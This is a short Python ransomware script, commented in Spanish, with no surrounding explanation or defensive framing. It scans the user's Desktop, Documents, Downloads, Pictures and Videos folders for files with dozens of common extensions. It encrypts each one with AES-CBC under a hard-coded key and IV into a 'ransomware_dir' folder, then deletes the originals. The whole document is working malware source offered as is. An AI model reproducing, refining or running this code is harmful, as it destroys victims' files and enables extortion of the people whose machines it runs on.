from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

username = os.getlogin()
home_dir = os.path.expanduser('~')

destination = os.path.join(home_dir, 'Desktop', 'ransomware_dir')

if not os.path.exists(destination):
    os.mkdir(destination)

desktop_dir = os.path.join(home_dir, 'Desktop')
videos_dir = os.path.join(home_dir, 'Videos')
pictures_dir = os.path.join(home_dir, 'Pictures')
documents_dir = os.path.join(home_dir, 'Documents')
downloads_dir = os.path.join(home_dir, 'Downloads')


extensions = [".txt", ".jpg", ".jpeg", ".mp4", ".mp3", ".png", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".zip", ".rar", ".7z", ".tar", ".gz", ".tgz", ".iso", ".exe", ".msi", ".bat", ".cmd", ".dll", ".sys", ".ini", ".log", ".html", ".htm", ".css", ".js", ".xml", ".json", ".sql", ".db", ".dbf", ".mdb", ".accdb", ".sdf", ".odt", ".ott", ".odp", ".otp", ".ods", ".ots", ".odg", ".otg", ".odf", ".odc", ".odb", ".odmf", ".odb", ".sxw", ".stw", ".sxc", ".stc", ".sxi", ".sti", ".sxd", ".std", ".py", ".cpp", ".c", ".java", ".php", ".pl", ".rb", ".sh", ".swift", ".js", ".html"]

key = 'XmtaJGYxBjLjp!56' # clave de cifrado (debe tener una longitud de 16, 24 o 32 bytes)
iv = 'BV9CZhPjX&cTPMGq' # vector de inicialización (debe tener una longitud de 16 bytes)

folders = [downloads_dir, desktop_dir, videos_dir, pictures_dir, documents_dir]

for folder in folders:
    if os.path.exists(folder):
        files = [os.path.join(folder, f) for f in os.listdir(folder) if os.path.isfile(os.path.join(folder, f)) and any(f.endswith(ext) for ext in extensions)]

        for file in files:
            encrypted_file_path = os.path.join(destination, os.path.basename(file) + '.encrypted')
            with open(file, 'rb') as f_in, open(encrypted_file_path, 'wb') as f_out:
                cipher = AES.new(key.encode('utf-8'), AES.MODE_CBC, iv.encode('utf-8'))
                while True:
                    chunk = f_in.read(1024)
                    if not chunk:
                        break
                    # agrega el relleno PKCS7 al chunk actual
                    padded_chunk = pad(chunk, AES.block_size)
                    # cifra el chunk actual
                    encrypted_chunk = cipher.encrypt(padded_chunk)
                    f_out.write(encrypted_chunk)
            os.remove(file)

print('Archivos cifrados exitosamente en la carpeta "ransomware_dir" en su Escritorio')
